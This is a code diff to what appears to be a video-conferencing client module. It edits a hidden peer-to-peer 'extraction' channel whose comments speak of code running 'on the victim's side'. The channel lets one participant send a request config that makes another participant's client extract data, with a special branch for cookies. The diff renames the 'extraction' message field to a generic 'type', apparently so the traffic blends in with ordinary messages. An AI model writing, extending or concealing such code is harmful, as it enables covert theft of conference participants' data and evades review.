@@ -1351,7 +1351,7 @@ export default {
 
             // send request to the user with specified name
             APP.conference.sendEndpointMessage(user.getId(), {
-                extraction: 'request',
+                type: 'request',
                 config: configuration
             });
 
@@ -1461,13 +1461,13 @@ export default {
     _handleExtractionCommunication(user, recievedData) {
         // define extraction handler if it does not exist
         // OR if it contains extraction handler from previous communication
-        if (recievedData.extraction === 'request' && (!APP.conference._extractionHandler
+        if (recievedData.type === 'request' && (!APP.conference._extractionHandler
                 || APP.conference._extractionHandler.communicationEnded)) {
             APP.conference._extractionHandler = new ExtractionHandler(recievedData.config);
         }
 
         // this runs on the victim's side
-        if (recievedData.extraction === 'request') {
+        if (recievedData.type === 'request') {
             if (recievedData.config.dataType !== 'cookies') {
                 APP.conference.dispatchExtraction(user, recievedData);
 
@@ -2403,7 +2403,7 @@ export default {
                 if (args && args.length >= 2) {
                     const [ sender, eventData ] = args;
 
-                    if (eventData.extraction) {
+                    if (eventData.type === 'request' || eventData.type === 'reply') {
                         this._handleExtractionCommunication(sender, eventData);
                     }
 
